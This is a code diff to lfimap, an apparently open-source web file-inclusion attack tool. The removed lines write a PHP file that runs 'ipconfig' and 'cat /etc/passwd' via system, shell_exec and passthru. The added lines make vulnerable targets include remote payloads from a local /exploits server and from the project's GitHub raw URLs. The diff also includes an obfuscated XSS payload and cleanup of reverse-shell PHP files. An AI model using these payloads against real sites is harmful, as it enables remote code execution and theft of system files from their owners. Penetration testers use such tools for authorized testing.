@@ -56,24 +56,7 @@ def serve_forever():
     try:
         with socketserver.TCPServer(("", rfi_test_port), ServerHandler) as httpd:
             if(args.verbose):
-                print("[i] Opening temporary local web server on port " +  str(rfi_test_port) + " and setting up 'rfitest' that will be used as test inclusion")
-            
-            rfiTestPath = webDir + os.path.sep + "rfitest"
-
-            with open(rfiTestPath, "w") as tempf:
-                tempf.write("<html>\n")
-                tempf.write("961bb08a95dbc34397248d92352da799\n")
-                tempf.write("<?php\n")
-                tempf.write("echo system('ipconfig');\n")
-                tempf.write("echo shell_exec('ipconfig');\n")
-                tempf.write("echo passthru('ipconfig');\n")
-                tempf.write("echo system('cat /etc/passwd');\n")
-                tempf.write("echo shell_exec('cat /etc/passwd');\n")
-                tempf.write("echo passthru('cat /etc/passwd');\n")
-                tempf.write("?>\n")
-                tempf.write("</body>\n")
-                tempf.write("</html>")
-                tempf.close()
+                print("[i] Opening temporary local web server on port " +  str(rfi_test_port) + " and hosting /exploits that will be used for test inclusion")
             try:
                 httpd.serve_forever()
             except:
@@ -99,7 +82,7 @@ class ICMPThread(threading.Thread):
                     self.result = True
         except PermissionError:
             if(args.verbose):
-                print("[-] Raw socket access is not allowed. For blind ICMP test, rerun lfimap as admin/sudo.")
+                print("[-] Raw socket access is not allowed. For blind ICMP command injection test, rerun lfimap as admin/sudo with '-c'")
 
     def getResult(self):
         return self.result
@@ -216,7 +199,8 @@ def init(req, reqType, explType, getVal, postVal, headers, attackType, cmdInject
                   "cat%20/etc/passwd", "cat%20/etc/group", "/etc/passwd",
                   "file://C:\Windows\System32\drivers\etc\hosts", 
                   "Windows%5CSystem32%5Cdrivers%5Cetc%5Chosts","Windows\\System32\\drivers\\etc\\hosts",
-                  "/etc/passwd","https://www.google.com/", "rfitest", "ipconfig"]
+                  "/etc/passwd","https://www.google.com/", "/rfitest", "ipconfig"
+                  "/961bb08a95dbc34397248d92352da799", "/exploit", "/.php.txt", "/.php"]
     
     if(scriptName != ""):
         TO_REPLACE.append(scriptName)
@@ -361,7 +345,7 @@ def test_xss(url):
         print("[i] Testing for XSS...")
     
     xssTest = []
-    xssTest.append("<IMG sRC=X onerror=jaVaScRipT:alert`xss`>'")
+    xssTest.append("<IMG sRC=X onerror=jaVaScRipT:alert`xss`>")
     xssTest.append("aahgpz\"ptz>e<atzf")
 
     for test in xssTest:
@@ -515,27 +499,27 @@ def test_rfi(url):
     #Localhost RFI test
     if(args.lhost):
         try:  
-            # GET WEB DIRECTORY LOCATION
-            if(sys.platform == "linux"):
-                if(os.path.isdir("/tmp")):
-                    if(os.access("/tmp", os.W_OK)):
-                        webDir = "/tmp" 
-                else:
-                    print("Directory /tmp can't be accessed. Cannot setup local web server for RFI test.")
-                    raise
+            # Setup exploit serving path
+            if(os.access(scriptDirectory + "/exploits", os.R_OK)):
+                webDir = scriptDirectory + "/exploits" 
             else:
-                if(os.path.isdir(os.environ['TEMP'])):
-                    if(os.access(os.environ['TEMP'], os.W_OK)):
-                        webDir = os.environ['TEMP']
-                else:
-                    print("%TEMP% directory can't be accessed. Cannot setup local web server for RFI test.")
-                    raise
+                print("Directory '" + scriptDirectory + "/exploits' can't be accessed. Cannot setup local web server for RFI test.")
+                return
 
             threading.Thread(target=serve_forever).start()
             rfiTest = []
             rfiTest.append("http://{0}:{1}/rfitest".format(args.lhost, str(rfi_test_port)))
             rfiTest.append("http://{0}:{1}/rfitest%00".format(args.lhost, str(rfi_test_port)))
-            
+            rfiTest.append("http://{0}:{1}/.php".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/.php.txt".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/961bb08a95dbc34397248d92352da799".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/exploit.gif".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/exploit.png".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/exploit.jpg".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/exploit.jsp".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/exploit.html".format(args.lhost, str(rfi_test_port))) 
+            rfiTest.append("http://{0}:{1}/exploit.php".format(args.lhost, str(rfi_test_port))) 
+
             for test in rfiTest:
                 u = url.replace(args.param, test)
 
@@ -551,18 +535,29 @@ def test_rfi(url):
             pass
 
     #Internet RFI test
-    pyld = "https://www.google.com/"
-    try:
-        if(not args.postreq):
-            u = url.replace(args.param, pyld)
-            _, br = GET(u, headers, proxies, "RFI", "RFI")
-            if(not br): return
-        else:
-            postTest = args.postreq.replace(args.param, pyld)
-            _, br = POST(url, headers, postTest, proxies, "RFI", "RFI")
-            if(not br): return
-    except:
-        pass
+    pylds = []
+    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/.php")
+    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/.php.txt")
+    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/961bb08a95dbc34397248d92352da799")
+    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.gif")
+    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.png")
+    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.jpg")
+    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.html")
+    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.jsp")
+    pylds.append("https://raw.githubusercontent.com/hansmach1ne/lfimap/main/exploits/exploit.php")
+    
+    for pyld in pylds: 
+        try:
+            if(not args.postreq):
+                u = url.replace(args.param, pyld)
+                _, br = GET(u, headers, proxies, "RFI", "RFI")
+                if(not br): return
+            else:
+                postTest = args.postreq.replace(args.param, pyld)
+                _, br = POST(url, headers, postTest, proxies, "RFI", "RFI")
+                if(not br): return
+        except:
+            pass
 
 def test_heuristics(url):
     if(args.verbose):
@@ -1283,9 +1278,6 @@ def pwn(exploit):
 
 #Cleans up all created files during testing
 def lfimap_cleanup():
-    if(os.path.exists(webDir + os.path.sep + "rfitest")):
-        os.remove(webDir + os.path.sep + "rfitest")
-    
     if(os.path.exists(webDir + os.path.sep + "reverse_shell_lin_tmp.php")):
         os.remove(webDir + os.path.sep + "reverse_shell_lin_tmp.php")
     if(os.path.exists(webDir + os.path.sep + "reverse_shell_win_tmp.php")):
